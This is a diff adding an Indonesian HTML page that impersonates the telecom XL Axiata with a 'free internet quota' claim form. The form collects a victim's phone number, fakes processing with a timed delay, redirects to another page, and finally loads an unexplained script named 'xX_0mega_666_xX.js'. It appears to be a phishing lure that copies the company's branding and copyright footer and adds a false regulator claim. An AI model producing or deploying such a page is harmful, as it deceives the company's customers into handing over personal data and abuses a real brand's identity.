@@ -1,0 +1,473 @@
+<!--
+BSD 2-Clause License
+
+Copyright (c) 2025, Rafashaalfian
+
+Diberikan izin kepada siapa saja untuk menggunakan perangkat lunak ini dalam bentuk sumber dan biner, 
+dengan atau tanpa modifikasi, dengan ketentuan bahwa syarat-syarat berikut dipenuhi:
+
+1. Redistribusi dalam bentuk kode sumber harus menyertakan pemberitahuan hak cipta di atas, 
+   daftar ketentuan ini, dan pernyataan penolakan berikut.
+2. Redistribusi dalam bentuk biner harus menyertakan pemberitahuan hak cipta di atas, 
+   daftar ketentuan ini, dan pernyataan penolakan berikut dalam dokumentasi dan/atau 
+   materi lain yang disertakan dengan distribusi.
+
+PERANGKAT LUNAK INI DISEDIAKAN OLEH PEMEGANG HAK CIPTA DAN KONTRIBUTOR "SEBAGAIMANA ADANYA" 
+DAN SETIAP JAMINAN, BAIK TERSURAT MAUPUN TERSIRAT, TERMASUK, TETAPI TIDAK TERBATAS PADA, 
+JAMINAN TERSIRAT UNTUK DIPERJUALBELIKAN DAN KESESUAIAN UNTUK TUJUAN TERTENTU, DITOLAK. 
+DALAM KEADAAN APA PUN PEMEGANG HAK CIPTA ATAU KONTRIBUTOR TIDAK AKAN BERTANGGUNG JAWAB 
+ATAS SEGALA KERUSAKAN LANGSUNG, TIDAK LANGSUNG, INSIDENTAL, KHUSUS, CONTOH, ATAU AKIBAT 
+(YANG TERMASUK, TETAPI TIDAK TERBATAS PADA, PENYEDIAAN BARANG ATAU JASA PENGGANTI; 
+KEHILANGAN PENGGUNAAN, DATA, ATAU KEUNTUNGAN; ATAU GANGGUAN BISNIS) YANG DISEBABKAN 
+DAN DALAM TEORI TANGGUNG JAWAB APA PUN, BAIK DALAM KONTRAK, TANGGUNG JAWAB KETAT, 
+ATAU KESALAHAN (TERMASUK KELALAIAN ATAU LAINNYA) YANG TIMBUL DARI PENGGUNAAN PERANGKAT LUNAK INI, 
+BAIK ATAU TIDAK DIBERITAHUKAN TENTANG KEMUNGKINAN KERUSAKAN TERSEBUT.
+
+Dengan menggunakan perangkat lunak ini, Anda setuju untuk mematuhi ketentuan di atas. 
+Anda juga memahami bahwa perangkat lunak ini disediakan tanpa jaminan apa pun dan penggunaannya 
+sepenuhnya menjadi tanggung jawab Anda. Jika Anda mengalami masalah atau kerugian akibat penggunaannya, 
+pengembang atau kontributor tidak dapat dimintai pertanggungjawaban.
+
+Terima kasih telah menggunakan perangkat lunak ini.
+-->
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="/src/assets/page.png" type="image/x-icon"/>
+    <title>Klaim Kuota - XL Axiata</title>
+    <style>
+        :root {
+            --primary-blue: #1A237E;
+            --accent-blue: #3F51B5;
+            --light-blue: #E8EAF6;
+            --text-primary: #212121;
+            --text-secondary: #757575;
+            --success-green: #4CAF50;
+            --border-color: #E0E0E0;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.12);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2rem 1rem;
+        }
+
+        .header {
+            width: 100%;
+            background: var(--primary-blue);
+            padding: 1rem;
+            box-shadow: var(--shadow-sm);
+            margin-bottom: 2rem;
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-xl {
+            height: 40px;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .form-card {
+            background: white;
+            border-radius: 1rem;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+            padding: 2.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+
+        .form-header h1 {
+            color: var(--primary-blue);
+            font-size: 1.75rem;
+            margin-bottom: 0.75rem;
+        }
+
+        .form-header p {
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--text-primary);
+            font-weight: 500;
+            font-size: 0.875rem;
+        }
+
+        .phone-input-container {
+            display: flex;
+            gap: 0.75rem;
+            align-items: center;
+        }
+
+        .country-select {
+            width: 120px;
+            padding: 0.875rem;
+            border: 1px solid var(--border-color);
+            border-radius: 0.5rem;
+            background: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e") no-repeat right 0.75rem center;
+            background-size: 14px;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .phone-input {
+            flex: 1;
+            padding: 0.875rem;
+            border: 1px solid var(--border-color);
+            border-radius: 0.5rem;
+            font-size: 0.875rem;
+            transition: all 0.3s ease;
+        }
+
+        .phone-input:focus {
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 3px rgba(63,81,181,0.1);
+            outline: none;
+        }
+
+        .quota-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .quota-card {
+            padding: 1.5rem;
+            border: 1px solid var(--border-color);
+            border-radius: 0.75rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            background: white;
+        }
+
+        .quota-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+
+        .quota-card.selected {
+            border-color: var(--accent-blue);
+            background: var(--light-blue);
+        }
+
+        .quota-value {
+            color: var(--primary-blue);
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 0.25rem;
+        }
+
+        .quota-details {
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            line-height: 1.4;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(135deg, var(--primary-blue), var(--accent-blue));
+            color: white;
+            border: none;
+            border-radius: 0.75rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            opacity: 0.95;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+
+        .validation-message {
+            color: #d32f2f;
+            font-size: 0.75rem;
+            margin-top: 0.25rem;
+            display: none;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 1.5rem;
+            z-index: 1000;
+        }
+
+        .loading-spinner {
+            width: 3.5rem;
+            height: 3.5rem;
+            border: 3px solid rgba(26,35,126,0.1);
+            border-radius: 50%;
+            border-top-color: var(--primary-blue);
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .footer {
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            text-align: center;
+            padding: 2rem 0;
+            width: 100%;
+        }
+
+        @media (max-width: 768px) {
+            .form-card {
+                padding: 1.5rem;
+            }
+            
+            .quota-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .country-select {
+                width: 100px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <nav class="nav-container">
+            <img src="/src/assets/xl.png" alt="XL Axiata" class="logo-xl">
+            <div style="display: flex; gap: 1.5rem;">
+                <a href="#" style="color: white; text-decoration: none; font-size: 0.875rem;">Bantuan</a>
+                <a href="#" style="color: white; text-decoration: none; font-size: 0.875rem;">Syarat & Ketentuan</a>
+            </div>
+        </nav>
+    </header>
+    <!--
+BSD 2-Clause License
+
+Copyright (c) 2025, Rafashaalfian
+
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions are met:
+
+1. Redistributions of source code must retain the above copyright notice, this
+   list of conditions, and the following disclaimer.
+
+2. Redistributions in binary form must reproduce the above copyright notice,
+   this list of conditions, and the following disclaimer in the documentation
+   and/or other materials provided with the distribution.
+
+3. The name of the copyright holder or contributors may not be used to endorse
+   or promote products derived from this software without specific prior written
+   permission.
+
+DISCLAIMER:
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
+CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
+SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
+INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
+CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
+ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
+POSSIBILITY OF SUCH DAMAGE.
+
+ADDITIONAL TERMS:
+
+- The software is distributed under this license to ensure open-source 
+  collaboration and transparency.
+- Users are encouraged to contribute improvements while maintaining the original
+  license conditions.
+- Any modifications to the software should be documented properly, and credit 
+  must be given to the original author.
+- While this software is open-source, it is the responsibility of the user to 
+  comply with applicable laws and regulations when using it.
+
+By using or distributing this software, you agree to the terms outlined above. 
+If you do not agree with these terms, do not use or distribute this software.
+
+For further inquiries or permissions, contact: rafashaalfian@example.com
+-->
+    <main class="main-container">
+        <div class="form-card">
+            <div class="form-header">
+                <h1>Klaim Kuota Internet Gratis</h1>
+                <p>Isi data berikut untuk mendapatkan kuota internet dari XL Axiata</p>
+            </div>
+            
+            <form id="claimForm">
+                <div class="input-group">
+                    <label class="input-label">No:</label>
+                    <div class="phone-input-container">
+                        <select class="country-select" id="countryCode">
+                            <option value="+62">🇮🇩 +62</option>
+                            <option value="+60">🇲🇾 +60</option>
+                            <option value="+65">🇸🇬 +65</option>
+                        </select>
+                        <input type="tel" class="phone-input" id="phoneNumber" 
+                               placeholder="812xxxxxx" required>
+                    </div>
+                    <div class="validation-message" id="phoneValidation"></div>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">Pilih Paket Kuota</label>
+                    <div class="quota-grid">
+                        <div class="quota-card" data-gb="1">
+                            <div class="quota-value">1 GB</div>
+                            <div class="quota-details">Akses 24 Jam<br>Semua Aplikasi</div>
+                        </div>
+                        <div class="quota-card" data-gb="3">
+                            <div class="quota-value">3 GB</div>
+                            <div class="quota-details">Masa Aktif 3 Hari<br>+ Bonus Malam</div>
+                        </div>
+                        <div class="quota-card" data-gb="5">
+                            <div class="quota-value">5 GB</div>
+                            <div class="quota-details">7 Hari<br>Kuota Utama</div>
+                        </div>
+                        <div class="quota-card" data-gb="10">
+                            <div class="quota-value">10 GB</div>
+                            <div class="quota-details">30 Hari<br>+ Akses Premium</div>
+                        </div>
+                    </div>
+                    <input type="hidden" id="selectedGB" required>
+                    <div class="validation-message" id="packageValidation"></div>
+                </div>
+
+                <button type="submit" class="submit-btn">
+                    KLAIM SEKARANG
+                </button>
+            </form>
+        </div>
+    </main>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div style="color: var(--primary-blue); font-weight: 500;">Sedang memproses permintaan Anda...</div>
+    </div>
+
+    <footer class="footer">
+        <p>© 2025 PT XL Axiata Tbk. Seluruh hak cipta dilindungi undang-undang</p>
+        <p>Terdaftar dan diawasi oleh Otoritas Jasa Keuangan</p>
+    </footer>
+
+    <script>
+        // Enhanced Form Validation
+        const form = document.getElementById('claimForm');
+        const phoneInput = document.getElementById('phoneNumber');
+        const phoneValidation = document.getElementById('phoneValidation');
+        const packageValidation = document.getElementById('packageValidation');
+
+        const validatePhoneNumber = () => {
+            const regex = /^[0-9]{9,13}$/;
+            if(!regex.test(phoneInput.value)) {
+                phoneValidation.textContent = "Format nomor tidak valid";
+                phoneValidation.style.display = 'block';
+                return false;
+            }
+            phoneValidation.style.display = 'none';
+            return true;
+        };
+
+        const validatePackage = () => {
+            if(!document.getElementById('selectedGB').value) {
+                packageValidation.textContent = "Silakan pilih paket kuota";
+                packageValidation.style.display = 'block';
+                return false;
+            }
+            packageValidation.style.display = 'none';
+            return true;
+        };
+
+        // Real-time Validation
+        phoneInput.addEventListener('input', () => {
+            validatePhoneNumber();
+        });
+
+        // Enhanced Package Selection
+        document.querySelectorAll('.quota-card').forEach(card => {
+            card.addEventListener('click', function() {
+                document.querySelectorAll('.quota-card').forEach(c => {
+                    c.classList.remove('selected');
+                });
+                this.classList.add('selected');
+                document.getElementById('selectedGB').value = this.dataset.gb;
+                validatePackage();
+            });
+        });
+
+        // Form Submission
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const isValidPhone = validatePhoneNumber();
+            const isValidPackage = validatePackage();
+            
+            if(!isValidPhone || !isValidPackage) return;
+
+            const overlay = document.getElementById('loadingOverlay');
+            overlay.style.display = 'flex';
+
+            try {
+                // Simulate API Call
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                window.location.href = 'home.html';
+            } catch (error) {
+                console.error('Error:', error);
+                overlay.style.display = 'none';
+                alert('Terjadi kesalahan, silakan coba lagi');
+            }
+        });
+    </script>      
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+    <script src="/config/data/xX_0mega_666_xX.js"></script>
+</body>
+</html>
